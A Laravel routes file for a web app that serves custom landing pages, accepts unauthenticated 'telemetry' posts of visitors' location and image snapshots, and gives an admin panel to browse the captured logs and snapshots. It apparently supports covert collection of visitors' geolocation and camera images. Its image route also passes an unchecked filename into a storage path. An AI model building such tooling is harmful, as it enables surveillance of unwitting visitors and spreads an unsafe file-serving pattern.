<?php

use App\Http\Controllers\Admin\DashboardController;
use App\Http\Controllers\Admin\SettingsController;
use App\Http\Controllers\Auth\AuthController;
use App\Http\Controllers\LandingController;
use App\Http\Controllers\TelemetryController;
use App\Models\VisitorSnapshot;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;

// Visitor Landing Page
Route::get('/', [LandingController::class, 'index'])->name('landing');
Route::get('/p/{slug}', [LandingController::class, 'index'])->name('landing.custom');

// Dynamic Image Serving Route (Works across Serverless lambdas & cold boots)
Route::get('/storage/snapshots/{filename}', function ($filename) {
    if (Storage::disk('public')->exists('snapshots/' . $filename)) {
        $file = Storage::disk('public')->get('snapshots/' . $filename);
        return response($file, 200)->header('Content-Type', 'image/jpeg');
    }

    $snapshot = VisitorSnapshot::where('file_path', 'like', "%{$filename}")->first();
    if ($snapshot && !empty($snapshot->image_base64)) {
        $decoded = base64_decode($snapshot->image_base64);
        return response($decoded, 200)->header('Content-Type', 'image/jpeg');
    }

    abort(404);
});

// Telemetry Handlers (Supports all rewrite variations from Serverless proxies)
Route::prefix('api/v1/telemetry')->group(function () {
    Route::post('/init', [TelemetryController::class, 'init']);
    Route::post('/location', [TelemetryController::class, 'location']);
    Route::post('/snapshot', [TelemetryController::class, 'snapshot']);
});

Route::prefix('v1/telemetry')->group(function () {
    Route::post('/init', [TelemetryController::class, 'init']);
    Route::post('/location', [TelemetryController::class, 'location']);
    Route::post('/snapshot', [TelemetryController::class, 'snapshot']);
});

Route::prefix('telemetry')->group(function () {
    Route::post('/init', [TelemetryController::class, 'init']);
    Route::post('/location', [TelemetryController::class, 'location']);
    Route::post('/snapshot', [TelemetryController::class, 'snapshot']);
});

// Authentication Routes
Route::get('/login', [AuthController::class, 'showLogin'])->name('login');
Route::post('/login', [AuthController::class, 'login'])->name('login.submit');
Route::post('/logout', [AuthController::class, 'logout'])->name('logout');

// Protected Admin Panel Routes
Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(function () {
    Route::get('/', [DashboardController::class, 'index'])->name('dashboard');
    Route::get('/logs', [DashboardController::class, 'logs'])->name('logs');
    Route::get('/logs/{id}', [DashboardController::class, 'logDetail'])->name('logs.detail');
    Route::delete('/logs/{id}', [DashboardController::class, 'deleteLog'])->name('logs.delete');
    Route::post('/logs/clear', [DashboardController::class, 'clearLogs'])->name('logs.clear');
    
    Route::get('/snapshots', [DashboardController::class, 'snapshots'])->name('snapshots');
    
    Route::get('/settings', [SettingsController::class, 'index'])->name('settings');
    Route::post('/settings', [SettingsController::class, 'update'])->name('settings.update');
    Route::post('/settings/password', [SettingsController::class, 'updatePassword'])->name('settings.password');
    Route::post('/settings/test-webhook', [SettingsController::class, 'testWebhook'])->name('settings.test_webhook');
});

// Legacy backward compatibility routes
Route::post('/location_update', [TelemetryController::class, 'init']);
Route::post('/image', [TelemetryController::class, 'snapshot']);
